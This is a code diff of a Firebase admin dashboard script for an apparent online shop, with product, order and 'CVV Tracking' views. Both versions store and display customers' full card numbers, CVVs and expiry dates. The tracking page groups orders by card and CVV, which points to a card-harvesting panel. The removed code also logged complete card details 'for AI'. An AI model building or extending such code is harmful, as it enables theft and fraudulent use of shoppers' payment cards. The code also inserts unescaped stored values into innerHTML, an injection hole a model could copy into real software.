@@ -1,5 +1,5 @@
 // ============================================
-// ADMIN DASHBOARD JAVASCRIPT - COMPLETE FIX
+// ADMIN DASHBOARD JAVASCRIPT - WORKING VERSION
 // ============================================
 
 // Global variables
@@ -33,15 +33,17 @@ auth.onAuthStateChanged(async (user) => {
 });
 
 // ============================================
-// NAVIGATION FUNCTIONS - NO EVENT OBJECT
+// NAVIGATION FUNCTIONS
 // ============================================
 
 function showDashboard() {
+    // Hide all sections
     document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
     document.getElementById('dashboard').classList.add('active');
     
+    // Update sidebar active state
     document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
-    document.querySelectorAll('.sidebar-menu li')[0].classList.add('active');
+    document.getElementById('menuDashboard').classList.add('active');
     
     document.getElementById('pageTitle').textContent = 'Dashboard';
 }
@@ -51,7 +53,7 @@ function showProducts() {
     document.getElementById('products').classList.add('active');
     
     document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
-    document.querySelectorAll('.sidebar-menu li')[1].classList.add('active');
+    document.getElementById('menuProducts').classList.add('active');
     
     document.getElementById('pageTitle').textContent = 'Products';
     loadProducts();
@@ -62,7 +64,7 @@ function showAddProduct() {
     document.getElementById('add-product').classList.add('active');
     
     document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
-    document.querySelectorAll('.sidebar-menu li')[2].classList.add('active');
+    document.getElementById('menuAddProduct').classList.add('active');
     
     document.getElementById('pageTitle').textContent = 'Add Product';
 }
@@ -72,7 +74,7 @@ function showOrders() {
     document.getElementById('orders').classList.add('active');
     
     document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
-    document.querySelectorAll('.sidebar-menu li')[3].classList.add('active');
+    document.getElementById('menuOrders').classList.add('active');
     
     document.getElementById('pageTitle').textContent = 'Orders';
     loadOrders();
@@ -83,59 +85,25 @@ function showCVVTracking() {
     document.getElementById('cvv-tracking').classList.add('active');
     
     document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
-    document.querySelectorAll('.sidebar-menu li')[4].classList.add('active');
+    document.getElementById('menuCVV').classList.add('active');
     
     document.getElementById('pageTitle').textContent = 'CVV Tracking';
     loadCVVTracking();
 }
 
 // ============================================
-// CARD DISPLAY FUNCTIONS
+// MASK CARD FUNCTION (Last Digit Hide)
 // ============================================
 
-// ✅ DATABASE MEIN: Full card number save hota hai (16 digits)
-// ✅ AI CHECK: Full number use kar sakta hai
-// ✅ DISPLAY MEIN: Sirf last digit hide for privacy
-
-function displayCardNumber(cardNumber) {
+function maskCardNumber(cardNumber) {
     if (!cardNumber) return 'N/A';
-    
-    // Remove spaces
     const clean = cardNumber.replace(/\s/g, '');
-    
     if (clean.length >= 16) {
-        // First 15 digits show, last 1 digit hide for display only
         const first15 = clean.slice(0, 15);
-        const lastDigit = clean.slice(15, 16);
-        
-        // Format with spaces
         const formatted = first15.match(/.{1,4}/g)?.join(' ') || first15;
-        
-        // Return for DISPLAY (last digit hidden)
-        return {
-            display: formatted + '*',           // For showing in table
-            full: clean,                        // For AI/backend use
-            lastDigit: lastDigit                 // Last digit for reference
-        };
+        return formatted + '*';
     }
-    
-    return {
-        display: cardNumber,
-        full: cardNumber,
-        lastDigit: ''
-    };
-}
-
-// For Orders Table - Show with last digit hidden
-function formatCardForDisplay(cardNumber) {
-    const result = displayCardNumber(cardNumber);
-    return result.display;
-}
-
-// For AI Check - Get full card number
-function getFullCardNumber(cardNumber) {
-    const result = displayCardNumber(cardNumber);
-    return result.full;
+    return cardNumber;
 }
 
 // ============================================
@@ -172,7 +140,7 @@ async function loadProducts() {
         tbody.innerHTML = '';
         
         if (snapshot.empty) {
-            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">No products found</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No products found</td></tr>';
             return;
         }
         
@@ -180,17 +148,12 @@ async function loadProducts() {
             const product = doc.data();
             tbody.innerHTML += `
                 <tr>
-                    <td>
-                        <img src="${product.imageUrl || 'https://placehold.co/50x50'}" 
-                             style="width:50px; height:50px; object-fit:cover; border-radius:5px;">
-                    </td>
+                    <td><img src="${product.imageUrl || 'https://placehold.co/50'}" class="product-image"></td>
                     <td>${product.name || ''}</td>
                     <td>$${product.price || 0}</td>
                     <td>${product.category || ''}</td>
                     <td>${product.stock || 0}</td>
-                    <td>
-                        <button onclick="deleteProduct('${doc.id}')" class="btn-delete">Delete</button>
-                    </td>
+                    <td><button class="btn-delete" onclick="deleteProduct('${doc.id}')">Delete</button></td>
                 </tr>
             `;
         });
@@ -200,42 +163,29 @@ async function loadProducts() {
 }
 
 // ============================================
-// ADD PRODUCT FORM
+// ADD PRODUCT
 // ============================================
 
 document.getElementById('productForm')?.addEventListener('submit', async (e) => {
     e.preventDefault();
     
     try {
-        const name = document.getElementById('productName').value;
-        const price = parseFloat(document.getElementById('productPrice').value);
-        const category = document.getElementById('productCategory').value;
-        const description = document.getElementById('productDescription').value;
-        const stock = parseInt(document.getElementById('productStock').value);
-        const imageUrl = document.getElementById('productImageUrl').value;
-        
         const productData = {
-            name: name,
-            price: price,
-            category: category,
-            description: description,
-            stock: stock,
-            imageUrl: imageUrl,
+            name: document.getElementById('productName').value,
+            price: parseFloat(document.getElementById('productPrice').value),
+            category: document.getElementById('productCategory').value,
+            description: document.getElementById('productDescription').value,
+            stock: parseInt(document.getElementById('productStock').value),
+            imageUrl: document.getElementById('productImageUrl').value,
             createdAt: new Date().toISOString()
         };
         
         await db.collection('products').add(productData);
-        
-        alert('✅ Product added successfully!');
-        
-        // Reset form
+        alert('✅ Product added!');
         document.getElementById('productForm').reset();
-        
-        // Go to products page
         showProducts();
         
     } catch (error) {
-        console.error('Error:', error);
         alert('Error: ' + error.message);
     }
 });
@@ -245,20 +195,15 @@ document.getElementById('productForm')?.addEventListener('submit', async (e) => 
 // ============================================
 
 async function deleteProduct(productId) {
-    if (confirm('Are you sure you want to delete this product?')) {
-        try {
-            await db.collection('products').doc(productId).delete();
-            loadProducts();
-            loadDashboardStats();
-        } catch (error) {
-            console.error('Error deleting product:', error);
-            alert('Error deleting product');
-        }
+    if (confirm('Delete this product?')) {
+        await db.collection('products').doc(productId).delete();
+        loadProducts();
+        loadDashboardStats();
     }
 }
 
 // ============================================
-// LOAD ORDERS - With Card Display (Last Digit Hidden)
+// LOAD ORDERS
 // ============================================
 
 async function loadOrders() {
@@ -268,30 +213,22 @@ async function loadOrders() {
         tbody.innerHTML = '';
         
         if (snapshot.empty) {
-            tbody.innerHTML = '<tr><td colspan="9" style="text-align: center;">No orders found</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No orders found</td></tr>';
             return;
         }
         
         snapshot.forEach(doc => {
             const order = doc.data();
-            const products = order.products || [];
-            const productNames = products.map(p => p.name).join(', ');
             const card = order.cardDetails || {};
-            
-            // ✅ Full card number is in database
-            // ✅ Display mein last digit hide
-            const displayCard = formatCardForDisplay(card.cardNumber);
-            
-            // For AI check - full number available in card.cardNumber
+            const maskedCard = maskCardNumber(card.cardNumber);
             
             tbody.innerHTML += `
                 <tr>
                     <td>#${doc.id.slice(-8)}</td>
                     <td>${order.userEmail || 'N/A'}</td>
-                    <td>${productNames.slice(0, 30)}${productNames.length > 30 ? '...' : ''}</td>
                     <td>$${order.totalAmount}</td>
-                    <td class="card-number" title="Full: ${card.cardNumber || ''}">${displayCard}</td>
-                    <td><strong>${card.cvv || 'N/A'}</strong></td>
+                    <td class="card-number">${maskedCard}</td>
+                    <td>${card.cvv || 'N/A'}</td>
                     <td>${card.expiry || 'N/A'}</td>
                     <td>${new Date(order.createdAt).toLocaleDateString()}</td>
                 </tr>
@@ -303,7 +240,7 @@ async function loadOrders() {
 }
 
 // ============================================
-// LOAD CVV TRACKING - With Card Display (Last Digit Hidden)
+// LOAD CVV TRACKING
 // ============================================
 
 async function loadCVVTracking() {
@@ -315,7 +252,7 @@ async function loadCVVTracking() {
             const order = doc.data();
             const card = order.cardDetails || {};
             const cvv = card.cvv;
-            const cardNumber = card.cardNumber;  // ✅ Full card number available
+            const cardNumber = card.cardNumber;
             const expiry = card.expiry || 'N/A';
             
             if (cvv && cardNumber) {
@@ -324,7 +261,7 @@ async function loadCVVTracking() {
                 if (!cvvStats[key]) {
                     cvvStats[key] = {
                         cvv: cvv,
-                        cardNumber: cardNumber,    // Full number for AI
+                        cardNumber: cardNumber,
                         expiry: expiry,
                         totalOrders: 0,
                         totalAmount: 0,
@@ -345,18 +282,17 @@ async function loadCVVTracking() {
         tbody.innerHTML = '';
         
         if (Object.keys(cvvStats).length === 0) {
-            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">No CVV data found</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No data found</td></tr>';
             return;
         }
         
         Object.values(cvvStats).forEach(stat => {
-            // ✅ Display mein last digit hide
-            const displayCard = formatCardForDisplay(stat.cardNumber);
+            const maskedCard = maskCardNumber(stat.cardNumber);
             
             tbody.innerHTML += `
                 <tr>
                     <td><strong>${stat.cvv}</strong></td>
-                    <td class="card-number" title="Full: ${stat.cardNumber}">${displayCard}</td>
+                    <td class="card-number">${maskedCard}</td>
                     <td>${stat.expiry}</td>
                     <td>${stat.totalOrders}</td>
                     <td>$${stat.totalAmount.toLocaleString()}</td>
@@ -371,35 +307,11 @@ async function loadCVVTracking() {
 }
 
 // ============================================
-// FUNCTION FOR AI CHECK - Get Full Card Details
-// ============================================
-
-// AI ko full card number chahiye to ye function use karo
-function getCardForAI(orderId) {
-    // This will be called when AI needs to check
-    db.collection('orders').doc(orderId).get().then(doc => {
-        if (doc.exists) {
-            const cardDetails = doc.data().cardDetails;
-            console.log('Full card for AI:', {
-                cardNumber: cardDetails.cardNumber,  // ✅ Full 16 digits
-                cvv: cardDetails.cvv,
-                expiry: cardDetails.expiry
-            });
-            return cardDetails;
-        }
-    });
-}
-
-// ============================================
 // LOGOUT
 // ============================================
 
 function logout() {
-    auth.signOut()
-        .then(() => {
-            window.location.href = 'index.html';
-        })
-        .catch((error) => {
-            console.error('Logout error:', error);
-        });
-                                                          }
+    auth.signOut().then(() => {
+        window.location.href = 'index.html';
+    });
+        }
